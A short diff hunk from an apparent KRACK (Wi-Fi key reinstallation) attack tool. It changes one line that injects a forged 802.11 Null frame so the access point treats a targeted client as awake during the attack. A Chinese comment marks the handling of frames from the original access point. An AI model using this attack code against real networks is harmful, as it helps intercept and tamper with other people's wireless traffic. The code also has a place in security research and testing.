@@ -415,7 +415,7 @@ class KRAckAttack():
 			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
 			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
 				log(WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
-				self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=p.addr2, addr3=self.apmac), True, self.netconfig.real_channel)
+				self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=self.clientmac, addr3=self.apmac), True, self.netconfig.real_channel)
 
 		# 2. 處理來自原本 AP 的 frames
 		elif p.addr2 == self.apmac:
